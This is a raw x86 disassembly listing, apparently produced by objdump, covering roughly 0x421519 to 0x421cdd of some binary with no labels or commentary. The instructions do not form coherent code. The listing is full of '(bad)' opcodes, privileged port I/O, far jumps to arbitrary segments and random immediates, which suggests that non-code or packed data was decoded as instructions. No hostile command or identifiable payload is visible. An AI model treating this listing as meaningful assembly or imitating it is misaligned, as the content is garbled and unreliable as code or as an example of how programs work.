  421519:	mov    BYTE PTR [ebp-0x2a509da9],bh
  42151f:	stc    
  421520:	aad    0x3a
  421522:	xchg   edi,eax
  421523:	sahf   
  421524:	pop    esi
  421525:	xchg   esp,eax
  421526:	jge    0x421577
  421528:	jle    0xdcc4e9d7
  42152e:	adc    al,0x8e
  421530:	and    al,BYTE PTR [edx+0x2e]
  421533:	mov    bh,0x5a
  421535:	fnstcw WORD PTR ds:0x55029e0
  42153b:	mov    eax,ds:0x590743e8
  421540:	in     eax,0xaa
  421542:	mov    ds:0x47d68b61,al
  421547:	loope  0x421565
  421549:	pop    ebp
  42154a:	gs cmp al,0xe8
  42154d:	cli    
  42154e:	out    dx,al
  42154f:	(bad)  
  421550:	sbb    DWORD PTR [ebx],esi
  421552:	(bad)  
  421553:	int3   
  421554:	call   DWORD PTR [edx-0x3443fc8c]
  42155a:	jne    0x4215b9
  42155c:	rol    BYTE PTR gs:[edx],1
  42155f:	xchg   ebp,eax
  421560:	jmp    0x3e60:0x7908ab98
  421567:	arpl   WORD PTR [ecx],di
  421569:	mov    dh,0xdf
  42156b:	pusha  
  42156c:	push   es
  42156d:	outs   dx,DWORD PTR ds:[esi]
  42156e:	mov    ch,BYTE PTR [ecx-0x549a8acf]
  421574:	ins    BYTE PTR es:[edi],dx
  421575:	ret    
  421576:	jl     0x421551
  421578:	adc    bh,dl
  42157a:	sub    al,0xda
  42157c:	dec    edx
  42157d:	aam    0xfb
  42157f:	xchg   ecx,eax
  421580:	jg     0x42151a
  421582:	sub    eax,0x90598a0f
  421587:	pop    ecx
  421588:	sbb    ebx,eax
  42158a:	cmp    eax,0x147511c5
  42158f:	mov    ecx,0x897462e0
  421594:	jns    0x421518
  421596:	stos   DWORD PTR es:[edi],eax
  421597:	mov    bl,0x56
  421599:	addr16 call 0x5aaf:0x89d22030
  4215a1:	jo     0x4215e3
  4215a3:	fcmovnu st,st(6)
  4215a5:	mov    dl,0x5
  4215a7:	in     eax,dx
  4215a8:	inc    edi
  4215a9:	mov    dh,0x1b
  4215ab:	data16 jo 0x4215f7
  4215ae:	push   eax
  4215af:	fiadd  DWORD PTR ds:0x73577575
  4215b5:	in     eax,dx
  4215b6:	imul   eax,esi,0x50
  4215b9:	ffree  st(7)
  4215bb:	sub    ecx,edx
  4215bd:	cmp    dl,BYTE PTR [ecx+0x19a3b0be]
  4215c3:	sbb    BYTE PTR [eax+0x5cff89ff],dh
  4215c9:	repz mov ch,0xeb
  4215cc:	shl    bl,0xfc
  4215cf:	jbe    0x4215fe
  4215d1:	ja     0x4215dd
  4215d3:	sub    esp,DWORD PTR [edi+ebx*8-0x1f]
  4215d7:	ret    0x57b
  4215da:	sti    
  4215db:	mul    DWORD PTR [esp+eiz*8]
  4215de:	mov    WORD PTR [esi-0x40],cs
  4215e1:	test   al,0xe3
  4215e3:	stos   BYTE PTR es:[edi],al
  4215e4:	xchg   esi,eax
  4215e5:	aam    0xf4
  4215e7:	mov    al,ds:0x1e236baf
  4215ec:	test   al,0x91
  4215ee:	in     eax,dx
  4215ef:	mov    DWORD PTR [edi+0xc],ebx
  4215f2:	sti    
  4215f3:	adc    BYTE PTR [ebx-0x4713b231],bh
  4215f9:	lea    esp,[ebp+0x3d]
  4215fc:	pop    ecx
  4215fd:	imul   ebp,DWORD PTR [esi],0xe11cfe39
  421603:	adc    eax,DWORD PTR [eax+esi*8-0x2a]
  421607:	pop    ebx
  421608:	xchg   ecx,eax
  421609:	dec    esi
  42160a:	push   ds
  42160b:	sub    DWORD PTR [ebx-0x7d],eax
  42160e:	xor    al,0x4e
  421610:	push   ds
  421611:	jbe    0x421636
  421613:	rcr    DWORD PTR [edi+0x475367aa],cl
  421619:	jae    0x4215b4
  42161b:	or     eax,eax
  42161d:	mov    ch,0x6c
  42161f:	ss ss cmp bl,0x7e
  421624:	lock fs add eax,0xe62457f2
  42162b:	inc    esp
  42162c:	pop    ebp
  42162d:	sub    bh,0x1c
  421630:	adc    al,0x27
  421632:	or     eax,0xc4fe642c
  421637:	pop    eax
  421638:	adc    DWORD PTR [esi+edi*4-0x68],0x629a67af
  421640:	jmp    0x42163b
  421642:	xor    bl,dh
  421644:	lods   eax,DWORD PTR ds:[esi]
  421645:	(bad)  
  421646:	leave  
  421647:	and    ebx,DWORD PTR [esi+0x5c]
  42164a:	or     eax,0x726c95ea
  42164f:	xchg   edx,eax
  421650:	cld    
  421651:	std    
  421652:	xchg   cl,ah
  421654:	imul   esi,DWORD PTR [eax+eiz*2-0x77],0x9229056f
  42165c:	mov    ecx,0x6853c8ee
  421661:	push   edi
  421662:	lea    ebx,[ebx+eiz*8+0x4d]
  421666:	scas   eax,DWORD PTR es:[edi]
  421667:	(bad)  
  421668:	pop    es
  421669:	call   0x39a87d20
  42166e:	mov    dh,0x26
  421670:	sub    edx,esp
  421672:	sub    al,0xd5
  421674:	call   FWORD PTR [eax-0x1597341b]
  42167a:	enter  0xa3fd,0x4e
  42167e:	leave  
  42167f:	rcr    ebp,0x71
  421682:	inc    ebx
  421683:	jmp    0x4216c8
  421685:	push   cs
  421686:	inc    esp
  421687:	cmp    al,0xd2
  421689:	div    DWORD PTR [esp+eax*1+0x234fe0fa]
  421690:	dec    esp
  421691:	sub    DWORD PTR [eax],edi
  421693:	inc    ecx
  421694:	jge    0x421630
  421696:	pop    esp
  421697:	mov    bl,0x82
  421699:	leave  
  42169a:	lahf   
  42169b:	push   ebx
  42169c:	xor    ebp,edx
  42169e:	in     al,dx
  42169f:	(bad)  
  4216a0:	mov    esp,0xf63502ba
  4216a5:	jae    0x421662
  4216a7:	mov    ecx,DWORD PTR [ebp+0x6b204688]
  4216ad:	xor    esi,DWORD PTR [ebp+0x4d]
  4216b0:	shl    DWORD PTR [eax+0x6b3b73ed],1
  4216b6:	pusha  
  4216b7:	and    dl,BYTE PTR ds:0x1c5e90fb
  4216bd:	in     al,dx
  4216be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216bf:	ins    BYTE PTR es:[edi],dx
  4216c0:	xor    ah,BYTE PTR [esi+0x6ab4ec24]
  4216c6:	and    BYTE PTR ds:0xfdcaf6ad,cl
  4216cc:	outs   dx,BYTE PTR ds:[esi]
  4216cd:	out    dx,eax
  4216ce:	imul   ebx,edx,0x80290d6d
  4216d4:	frstor [edx+0x2f280640]
  4216da:	dec    eax
  4216db:	call   0xd8be:0xfa27a9a7
  4216e2:	sbb    DWORD PTR [eax+edx*8],0x23e21360
  4216e9:	mov    al,ds:0xcdd326
	...
  4216fa:	and    BYTE PTR [esi],dl
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	div    ch
  421707:	mul    ebp
  421709:	imul   esp,eax,0xffffff92
  42170c:	add    DWORD PTR [eax],eax
  42170e:	sti    
  42170f:	add    DWORD PTR [eax],eax
  421711:	add    cl,ah
  421713:	aad    0xcf
  421715:	ins    DWORD PTR es:[edi],dx
  421716:	lods   al,BYTE PTR ds:[esi]
  421717:	and    al,0x37
  421719:	enter  0xc958,0x7b
  42171d:	in     eax,dx
  42171e:	fwait
  42171f:	retf   0xa0c1
  421722:	test   al,0xa4
  421724:	nop
  421725:	outs   dx,BYTE PTR ds:[esi]
  421726:	jbe    0x42171b
  421728:	sub    ebp,eax
  42172a:	fdivp  st(7),st
  42172c:	pop    ebp
  42172d:	(bad)  
  42172e:	jae    0x42170c
  421730:	retf   
  421731:	add    DWORD PTR [ecx+eiz*1],0x130b794e
  421738:	mov    WORD PTR [ebx],es
  42173a:	add    DWORD PTR [edi+0x4d],0xcc2d464f
  421741:	mov    al,bh
  421743:	add    DWORD PTR [ebp+esi*4-0x6e],esi
  421747:	aaa    
  421748:	sub    al,0x5
  42174a:	test   BYTE PTR [eax-0x4a26b45e],0xa9
  421751:	call   edi
  421753:	push   ecx
  421754:	cmp    ebp,DWORD PTR [eax]
  421756:	popf   
  421757:	and    DWORD PTR [edx-0x752170b8],esp
  42175d:	fwait
  42175e:	mov    cl,BYTE PTR [edx+ecx*8-0x6ad83f7b]
  421765:	jmp    0x4d42fd6d
  42176a:	mov    ds:0x34787608,al
  42176f:	dec    DWORD PTR [ecx+0x59]
  421772:	out    dx,eax
  421773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421774:	icebp  
  421775:	mov    ds:0x4d5c203b,eax
  42177a:	rcr    DWORD PTR [eax-0x3c],0x67
  42177e:	cld    
  42177f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421780:	jmp    0x421710
  421782:	idiv   BYTE PTR [edi+0x66]
  421785:	xchg   esp,eax
  421786:	push   edi
  421787:	sub    DWORD PTR [edi],0xffffffb2
  42178a:	sahf   
  42178b:	xchg   esp,eax
  42178c:	loopne 0x4217bd
  42178e:	outs   dx,DWORD PTR ds:[esi]
  42178f:	pop    edx
  421790:	dec    edx
  421791:	pop    ss
  421792:	sbb    DWORD PTR [edi+0x41],edx
  421795:	cld    
  421796:	je     0x42178d
  421798:	sbb    eax,0x13bdc1e3
  42179d:	stc    
  42179e:	xor    cl,ah
  4217a0:	dec    esi
  4217a1:	out    0x41,eax
  4217a3:	repnz stos BYTE PTR es:[edi],al
  4217a5:	add    dh,BYTE PTR [ebx+esi*1+0x38]
  4217a9:	inc    ecx
  4217aa:	push   ecx
  4217ab:	fdiv   DWORD PTR [esi+0x474495d4]
  4217b1:	cld    
  4217b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217b3:	dec    edi
  4217b4:	outs   dx,BYTE PTR ds:[esi]
  4217b5:	xchg   ebp,eax
  4217b6:	sub    cl,BYTE PTR [ebp-0x6b]
  4217b9:	cmc    
  4217ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217bb:	jb     0x4217a5
  4217bd:	je     0x421762
  4217bf:	and    al,0x1a
  4217c1:	bound  ebx,QWORD PTR [edi-0x1efee9b6]
  4217c7:	dec    ah
  4217c9:	sbb    bh,BYTE PTR [ecx-0x4a]
  4217cc:	outs   dx,DWORD PTR ds:[esi]
  4217cd:	(bad)
  4217d1:	jl     0x4217b7
  4217d3:	inc    bp
  4217d5:	mov    dl,0x58
  4217d7:	cmc    
  4217d8:	xchg   ebp,eax
  4217d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217da:	xor    eax,0x3282ba2d
  4217df:	jno    0x4217e8
  4217e1:	or     ch,ch
  4217e3:	push   edi
  4217e4:	cmp    cl,bh
  4217e6:	inc    edx
  4217e7:	xor    al,BYTE PTR [ebx-0x10e99fb2]
  4217ed:	bound  esp,QWORD PTR es:[edx-0x33]
  4217f1:	maxps  xmm1,XMMWORD PTR ds:0x1a7e4ba3
  4217f8:	dec    edi
  4217f9:	sbb    DWORD PTR [eax],esp
  4217fb:	enter  0x9bb4,0xcd
  4217ff:	push   0x3f264d8e
  421804:	inc    eax
  421805:	repz add DWORD PTR [edx-0x7e],ebx
  421809:	xchg   edx,eax
  42180a:	and    ebp,ebp
  42180c:	popf   
  42180d:	les    eax,FWORD PTR [esi]
  42180f:	test   al,0xef
  421811:	imul   ebp,ecx,0xffffffab
  421814:	mov    bl,0xf0
  421816:	dec    edi
  421817:	mov    eax,0xc4761f05
  42181c:	les    eax,FWORD PTR [eax-0x67]
  42181f:	stos   BYTE PTR es:[edi],al
  421820:	aad    0xf9
  421822:	sub    al,0xa7
  421824:	in     eax,0xcf
  421826:	pop    ss
  421827:	xor    eax,0x433f68d7
  42182c:	sub    eax,0xc4a3a879
  421831:	xchg   esi,eax
  421832:	sub    BYTE PTR [eax-0x64],0xf1
  421836:	repnz outs dx,BYTE PTR ds:[esi]
  421838:	ds aas 
  42183a:	shr    DWORD PTR [ecx-0x7b60d1cc],cl
  421840:	mov    edi,0x53dc32a1
  421845:	and    eax,0x9f017c79
  42184a:	add    ebx,DWORD PTR [ecx+0x3ce9708]
  421850:	mov    ch,0x16
  421852:	(bad)  [ecx-0x4e529182]
  421858:	jb     0x4217ef
  42185a:	retf   
  42185b:	test   eax,0xb962a175
  421860:	lods   al,BYTE PTR ds:[esi]
  421861:	ins    DWORD PTR es:[edi],dx
  421862:	cmp    eax,DWORD PTR [esi+0x64a58e63]
  421868:	or     BYTE PTR [edx+eiz*2+0x54940c35],ch
  42186f:	and    bh,ah
  421871:	nop
  421872:	mov    bh,0x30
  421874:	call   0x720f434a
  421879:	les    edi,FWORD PTR [ebx+0x284f9422]
  42187f:	pushaw 
  421881:	mov    ebp,0x2d4335e4
  421886:	test   al,0xc9
  421888:	inc    ecx
  421889:	cwde   
  42188a:	fcmovnb st,st(1)
  42188c:	stos   BYTE PTR es:[edi],al
  42188d:	lds    esp,FWORD PTR [ebx]
  42188f:	(bad)  
  421890:	mov    dh,0xc0
  421892:	mov    ch,0x34
  421894:	(bad)  
  421895:	sub    eax,0xc4ea5fae
  42189a:	mov    al,0x68
  42189c:	mov    ds:0x7c53fdd3,al
  4218a1:	popa   
  4218a2:	add    BYTE PTR [eax-0x150a7f48],cl
  4218a8:	shl    DWORD PTR [eax],0xc1
  4218ab:	jecxz  0x42187b
  4218ad:	scas   al,BYTE PTR es:[edi]
  4218ae:	loop   0x421884
  4218b0:	mov    eax,ds:0xce9f53e3
  4218b5:	sahf   
  4218b6:	fsub   st,st(7)
  4218b8:	pop    ss
  4218b9:	sbb    BYTE PTR [eax+0x199fcc93],dl
  4218bf:	add    BYTE PTR [edi+0x3970d740],dl
  4218c5:	je     0x421869
  4218c7:	fdivr  QWORD PTR [ebx]
  4218c9:	xor    DWORD PTR [eax+ecx*1+0x4b],0x68
  4218ce:	cs jge 0x42191f
  4218d1:	jmp    0x8e32:0x2021ba5c
  4218d8:	js     0x421868
  4218da:	shl    ecx,1
  4218dc:	add    eax,0x419edf3f
  4218e1:	popf   
  4218e2:	xchg   edx,eax
  4218e3:	pop    edi
  4218e4:	xor    DWORD PTR [esi+ecx*8],ebx
  4218e7:	fdivr  QWORD PTR [esi]
  4218e9:	pop    edi
  4218ea:	mov    al,0x9c
  4218ec:	pop    esp
  4218ed:	xchg   ebx,eax
  4218ee:	jb     0x42194c
  4218f0:	sub    DWORD PTR [edx+0x4f77e249],esp
  4218f6:	jne    0x42188e
  4218f8:	ss xchg ebx,eax
  4218fa:	mov    BYTE PTR [ecx-0x5c447d81],bh
  421900:	(bad)  
  421901:	cli    
  421902:	mov    edi,0x9dbd5ae3
  421907:	xor    al,0xac
  421909:	arpl   WORD PTR [edi+eiz*1],si
  42190c:	xchg   DWORD PTR [eax],eax
	...
  42191a:	mov    al,0x33
  42191c:	cmp    ch,BYTE PTR [ecx+0x3bb3a9bb]
  421922:	pop    DWORD PTR [edx-0x44]
  421925:	mov    ch,dl
  421927:	push   ds
  421928:	inc    eax
  421929:	jo     0x421906
  42192b:	xchg   esp,eax
  42192c:	add    DWORD PTR [eax],eax
  42192e:	sti    
  42192f:	add    DWORD PTR [eax],eax
  421931:	add    dh,cl
  421933:	loopne 0x42192e
  421935:	or     BYTE PTR [eax],0x4d
  421938:	or     eax,0xd09028bd
  42193d:	push   ss
  42193e:	inc    ebx
  42193f:	push   ebx
  421940:	jb     0x42197f
  421942:	adc    DWORD PTR [eax-0x59],ebx
  421945:	ldmxcsr DWORD PTR [esi]
  421948:	(bad)  
  421949:	clc    
  42194a:	mov    esp,0xff7dd01a
  42194f:	out    dx,al
  421950:	es and esi,esp
  421953:	sar    DWORD PTR [ecx+edx*8-0xa],cl
  421957:	leave  
  421958:	xor    ebp,DWORD PTR [ebp+0x106647c7]
  42195e:	xchg   esp,eax
  42195f:	or     eax,0xc315b000
  421964:	test   ebx,edx
  421966:	in     al,dx
  421967:	xchg   BYTE PTR [edi-0x32],ch
  42196a:	dec    ebx
  42196b:	mov    eax,0x5d1a01bd
  421970:	or     al,0xe9
  421972:	jnp    0x421936
  421974:	fwait
  421975:	cmp    eax,0xe17e4d9
  42197a:	mov    DWORD PTR [ecx],ecx
  42197c:	fsub   QWORD PTR [edi+0x78e25260]
  421982:	sub    al,0xf7
  421984:	lea    ebp,ds:[ebx+0x7007b488]
  42198b:	sbb    al,0x53
  42198d:	test   WORD PTR [ebx-0x223e6a3f],0x3ab3
  421996:	out    0x82,al
  421998:	fbld   TBYTE PTR [ecx]
  42199a:	mov    dl,BYTE PTR cs:[edx+0x18]
  42199e:	xchg   edx,eax
  42199f:	ret    0xb08f
  4219a2:	ja     0x421936
  4219a4:	les    esi,FWORD PTR [edx]
  4219a6:	lods   eax,DWORD PTR ds:[esi]
  4219a7:	pop    ss
  4219a8:	or     al,0x27
  4219aa:	or     BYTE PTR [ebx-0x3f],bl
  4219ad:	jge    0x421a16
  4219af:	pop    ecx
  4219b0:	repz pop ebx
  4219b2:	xor    edi,DWORD PTR [eax]
  4219b4:	xchg   DWORD PTR [edi+0x23a5ec6],ebx
  4219ba:	adc    ch,BYTE PTR [eax+0x2c9e759]
  4219c0:	les    ebx,FWORD PTR [eax-0x24]
  4219c3:	mov    edx,DWORD PTR [edx+0x6a]
  4219c6:	lahf   
  4219c7:	pop    esi
  4219c8:	call   0x9dea:0x50b454a6
  4219cf:	fmul   DWORD PTR [edi]
  4219d1:	adc    edi,DWORD PTR [eax+0x2b]
  4219d4:	div    BYTE PTR [esi-0x2d]
  4219d7:	xchg   ecx,eax
  4219d8:	push   ebp
  4219d9:	sub    DWORD PTR [ebx+0x4a6df4f8],esi
  4219df:	dec    edx
  4219e0:	shl    DWORD PTR [esi],0xc1
  4219e3:	xchg   ebx,eax
  4219e4:	into   
  4219e5:	in     al,dx
  4219e6:	pushf  
  4219e7:	add    al,0xe7
  4219e9:	sub    DWORD PTR [esp+eiz*4],esi
  4219ec:	cmp    cl,ch
  4219ee:	or     BYTE PTR [ebx],dh
  4219f0:	push   ebp
  4219f1:	fdiv   st(0),st
  4219f3:	mov    ds:0xae61c15e,eax
  4219f8:	add    BYTE PTR [eax],dh
  4219fa:	fcom   QWORD PTR [esi]
  4219fc:	std    
  4219fd:	adc    dh,BYTE PTR [ebx-0x9]
  421a00:	std    
  421a01:	jne    0x4219ce
  421a03:	iret   
  421a04:	sbb    eax,0xdd122656
  421a09:	cmp    edx,ebp
  421a0b:	push   ds
  421a0c:	push   ss
  421a0d:	jno    0x421a0f
  421a0f:	mov    al,0xcd
  421a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a12:	mov    bh,BYTE PTR [ebx+ebp*4]
  421a15:	aaa    
  421a16:	pop    ecx
  421a17:	das    
  421a18:	(bad)  
  421a19:	hlt    
  421a1a:	or     ah,ah
  421a1c:	in     al,0xdc
  421a1e:	mov    edx,ebx
  421a20:	sub    edi,DWORD PTR [edi-0x24]
  421a23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a24:	ins    DWORD PTR es:[edi],dx
  421a25:	sub    DWORD PTR [ebx],ebp
  421a27:	jge    0x4219dc
  421a29:	sub    ah,BYTE PTR [ebx+0x2be940de]
  421a2f:	dec    edx
  421a30:	sbb    DWORD PTR [ebx],esp
  421a32:	cmp    dl,0xf0
  421a35:	mov    cs,WORD PTR [edx]
  421a37:	(bad)  
  421a39:	push   cs
  421a3a:	push   esi
  421a3b:	push   edx
  421a3c:	scas   al,BYTE PTR es:[edi]
  421a3d:	pop    edi
  421a3e:	repz jp 0x421a6c
  421a41:	dec    edi
  421a42:	fdivr  st,st(6)
  421a44:	mov    ecx,0x6ce06f0d
  421a49:	xor    eax,0x8a124498
  421a4e:	test   al,0x95
  421a50:	mov    esi,0x902d0481
  421a55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a56:	retf   0x7d21
  421a59:	enter  0x9f74,0x56
  421a5d:	pop    edi
  421a5e:	pop    ss
  421a5f:	bound  esi,QWORD PTR [eax+0x4f]
  421a62:	div    BYTE PTR [edi+edi*1+0x4a]
  421a66:	mov    ebx,0x887fc3e7
  421a6b:	push   eax
  421a6c:	jmp    0xb2cc59b1
  421a71:	mov    ds:0x780e7912,eax
  421a76:	sbb    DWORD PTR [ecx-0x30],ecx
  421a79:	ja     0x421a1b
  421a7b:	inc    ebp
  421a7c:	jecxz  0x421a59
  421a7e:	add    DWORD PTR [esi+0x73c1bfb3],esp
  421a84:	ss std 
  421a86:	xlat   BYTE PTR ds:[ebx]
  421a87:	aaa    
  421a88:	mov    bh,0x30
  421a8a:	in     eax,dx
  421a8b:	xchg   esp,eax
  421a8c:	sub    esp,DWORD PTR [ebx-0x2a]
  421a8f:	mov    esp,0x81f6cfe3
  421a94:	and    al,0x80
  421a96:	outs   dx,DWORD PTR ds:[esi]
  421a97:	mov    BYTE PTR [ebx],ah
  421a99:	and    al,0x92
  421a9b:	ror    BYTE PTR [ebp+0x6d],cl
  421a9e:	bound  esp,QWORD PTR [edi]
  421aa0:	xchg   edi,eax
  421aa1:	pop    esp
  421aa2:	inc    eax
  421aa3:	fnstenv [ebp-0x24b8fc65]
  421aa9:	cli    
  421aaa:	aaa    
  421aab:	inc    edi
  421aac:	jno    0x421a9d
  421aae:	dec    edi
  421aaf:	lahf   
  421ab0:	xchg   esi,eax
  421ab1:	jb     0x421ad2
  421ab3:	sahf   
  421ab4:	enter  0x215f,0x30
  421ab8:	xchg   BYTE PTR [eax+0xd],bl
  421abb:	jbe    0x421ad0
  421abd:	hlt    
  421abe:	clc    
  421abf:	in     al,dx
  421ac0:	xor    BYTE PTR [edi*2-0x5bddbeb],bl
  421ac7:	lods   eax,DWORD PTR ds:[esi]
  421ac8:	in     al,dx
  421ac9:	mov    bh,BYTE PTR [edi]
  421acb:	add    al,0x2f
  421acd:	mov    esi,0x82b2df3d
  421ad2:	icebp  
  421ad3:	mov    edx,0xaa899b02
  421ad8:	pop    ebp
  421ad9:	sub    ch,BYTE PTR [ebp+0x1]
  421adc:	cmp    bl,dh
  421ade:	jg     0x421b48
  421ae0:	mov    edx,0x8c8f958f
  421ae5:	pop    esp
  421ae6:	xchg   esi,eax
  421ae7:	adc    BYTE PTR [ebx-0x18dfb72],0x8e
  421aee:	adc    cl,BYTE PTR [edi]
  421af0:	jp     0x421aee
  421af2:	xor    eax,0xdeeb79f2
  421af7:	xchg   ebx,eax
  421af8:	sub    eax,DWORD PTR [bp+di]
  421afb:	jmp    0xc33b:0x1f1b6067
  421b02:	lea    ecx,[edx+0xecad2cf]
  421b08:	sub    al,0x11
  421b0a:	mov    ah,ch
  421b0c:	fldenv [edx+0x1b247582]
  421b12:	cmp    eax,0x8f58986b
  421b17:	sbb    DWORD PTR [eax-0x4b8e7572],0x4cc46599
  421b21:	xchg   ebp,eax
  421b22:	ror    BYTE PTR [edx],1
  421b24:	rol    BYTE PTR [edi+edi*8],0x25
  421b28:	dec    ebp
  421b29:	xchg   edx,eax
  421b2a:	ficom  DWORD PTR [eax+eax*8]
	...
  421b39:	add    BYTE PTR [ecx-0x6b36a2],ch
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0x442af8f7
  421b48:	xor    al,0x64
  421b4a:	(bad)  
  421b4b:	xchg   esi,eax
  421b4c:	add    DWORD PTR [eax],eax
  421b4e:	sti    
  421b4f:	add    DWORD PTR [eax],eax
  421b51:	add    BYTE PTR [ebx],ah
  421b53:	pop    edx
  421b54:	xchg   DWORD PTR [edx+edx*2-0x4d],eax
  421b58:	int    0xf5
  421b5a:	jmp    0x421b07
  421b5c:	xor    edx,DWORD PTR ds:0x3e444747
  421b62:	ret    
  421b63:	lods   al,BYTE PTR ds:[esi]
  421b64:	cmp    DWORD PTR [esi+0x4d],0xfe45f0b6
  421b6b:	cdq    
  421b6c:	loope  0x421b9e
  421b6e:	dec    edi
  421b6f:	mov    ecx,0xd10724ef
  421b74:	loope  0x421b63
  421b76:	dec    esi
  421b77:	xchg   edx,eax
  421b78:	xlat   BYTE PTR ds:[ebx]
  421b79:	pop    esp
  421b7a:	outs   dx,BYTE PTR ds:[esi]
  421b7b:	dec    BYTE PTR [esi-0x6]
  421b7e:	mov    al,0x37
  421b80:	repz ds push es
  421b83:	adc    al,0x2b
  421b85:	popa   
  421b86:	cli    
  421b87:	cwde   
  421b88:	adc    eax,0x4c5fd2e5
  421b8d:	mov    ch,0xf4
  421b8f:	xchg   ebp,eax
  421b90:	out    dx,al
  421b91:	dec    esi
  421b92:	out    dx,al
  421b93:	mov    dl,0xbb
  421b95:	pop    ss
  421b96:	rcr    DWORD PTR [edx+0x47],1
  421b99:	xchg   edx,eax
  421b9a:	xchg   ecx,eax
  421b9b:	push   esi
  421b9c:	ret    0x25c0
  421b9f:	(bad)  
  421ba0:	shl    BYTE PTR [ebx],1
  421ba2:	fisttp DWORD PTR [edi+0x13]
  421ba5:	jb     0x421bbb
  421ba7:	cmp    eax,0x98b49a70
  421bac:	jne    0x421bb6
  421bae:	add    ecx,DWORD PTR [ebx+eiz*8-0x33]
  421bb2:	cmp    ch,BYTE PTR [edi+0x44cc573c]
  421bb8:	(bad)  
  421bb9:	pop    ecx
  421bba:	adc    al,0x2
  421bbc:	(bad)  
  421bbd:	sahf   
  421bbe:	xchg   esi,eax
  421bbf:	push   ecx
  421bc0:	outs   dx,BYTE PTR ds:[esi]
  421bc1:	(bad)  
  421bc2:	mov    ecx,0x7dde2cf
  421bc7:	das    
  421bc8:	out    0xf0,eax
  421bca:	in     eax,dx
  421bcb:	mov    edx,0x2474eb02
  421bd0:	das    
  421bd1:	in     eax,0x41
  421bd3:	addr16 inc ebx
  421bd5:	call   0x7ceaa0ed
  421bda:	mov    ecx,0xa9b068b2
  421bdf:	adc    esi,DWORD PTR [eax-0x5d]
  421be2:	sub    BYTE PTR [eax+0x22],0x3d
  421be6:	pop    es
  421be7:	xor    eax,0xf99da045
  421bec:	mov    ecx,0xdb056fbb
  421bf1:	sbb    ah,ch
  421bf3:	jmp    0xa55f:0xe420cea5
  421bfa:	xlat   BYTE PTR ds:[ebx]
  421bfb:	and    ebx,DWORD PTR [esp+ebp*8-0x70]
  421bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c00:	mov    bh,0x8a
  421c02:	mov    edi,0x928092e0
  421c07:	in     eax,0xd6
  421c09:	jne    0x421bc1
  421c0b:	neg    BYTE PTR [ebp+esi*4+0x6b14dd74]
  421c12:	rcpps  xmm7,xmm7
  421c15:	lods   eax,DWORD PTR ds:[esi]
  421c16:	pop    ecx
  421c17:	jecxz  0x421c00
  421c19:	retf   0x6d30
  421c1c:	add    ecx,esi
  421c1e:	pop    eax
  421c1f:	ret    
  421c20:	pop    ebp
  421c21:	test   BYTE PTR [ebp-0x70],bl
  421c24:	bound  esp,QWORD PTR [edx]
  421c26:	sub    eax,0x296e3972
  421c2b:	outs   dx,BYTE PTR ds:[esi]
  421c2c:	cmp    ch,BYTE PTR [ebp+0x1f12266e]
  421c32:	or     al,0x53
  421c34:	adc    eax,0xddfcb3ce
  421c39:	mov    ds,WORD PTR [ecx]
  421c3b:	and    al,0xe5
  421c3d:	adc    al,ch
  421c3f:	cwde   
  421c40:	jmp    0x421c6f
  421c42:	cmp    eax,0x5c813d7d
  421c47:	fadd   QWORD PTR ds:[edi-0x5d]
  421c4b:	jb     0x421c01
  421c4d:	add    edi,DWORD PTR [eax+0x56]
  421c50:	loope  0x421c7c
  421c52:	sbb    al,ch
  421c54:	jae    0x421cc3
  421c56:	lods   al,BYTE PTR ds:[esi]
  421c57:	nop
  421c58:	pop    edx
  421c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c5a:	xchg   ebx,eax
  421c5b:	out    dx,al
  421c5c:	pop    eax
  421c5d:	and    BYTE PTR [ecx+edi*2+0x22da8ebe],dl
  421c64:	jmp    0x6c82a18c
  421c69:	cmc    
  421c6a:	jge    0x421c5f
  421c6c:	add    DWORD PTR [edi+0x4a],esi
  421c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c70:	push   edx
  421c71:	add    al,0x4e
  421c73:	cdq    
  421c74:	int    0x31
  421c76:	add    eax,0x2afa5cd2
  421c7b:	add    eax,0x34c7b8b7
  421c80:	adc    bl,bl
  421c82:	neg    DWORD PTR [ebx-0x7f]
  421c85:	push   edx
  421c86:	xchg   ebx,ecx
  421c88:	sahf   
  421c89:	add    eax,DWORD PTR [esi+0x59]
  421c8c:	scas   eax,DWORD PTR es:[edi]
  421c8d:	pop    edx
  421c8e:	push   ebp
  421c8f:	dec    edx
  421c90:	mov    al,0xf5
  421c92:	xchg   esi,eax
  421c93:	ja     0x421c36
  421c95:	cld    
  421c96:	or     eax,0x393d3015
  421c9b:	popf   
  421c9c:	mov    dh,0xe8
  421c9e:	xor    ebx,DWORD PTR [edx+esi*1-0x31]
  421ca2:	pop    ds
  421ca3:	lods   al,BYTE PTR ds:[esi]
  421ca4:	cli    
  421ca5:	add    DWORD PTR [ebx+0x391ab02d],eax
  421cab:	ret    
  421cac:	cmp    ebx,DWORD PTR [esi-0x6f]
  421caf:	inc    BYTE PTR [esi+0x2bbc1451]
  421cb5:	adc    edi,DWORD PTR ds:0x69bc6a8b
  421cbb:	pop    ds
  421cbc:	in     eax,dx
  421cbd:	dec    edx
  421cbe:	call   0x82b6fbbb
  421cc3:	or     eax,0xac179b96
  421cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cc9:	pop    ecx
  421cca:	pop    ecx
  421ccb:	jbe    0x421c59
  421ccd:	sub    eax,0xdb140f08
  421cd2:	xchg   ecx,eax
  421cd3:	stos   BYTE PTR es:[edi],al
  421cd4:	cwde   
  421cd5:	push   edx
  421cd6:	xor    al,0x56
  421cd8:	mov    eax,ds:0xa914792b
  421cdd:	mov    eax,ds:0xbd4e68cb
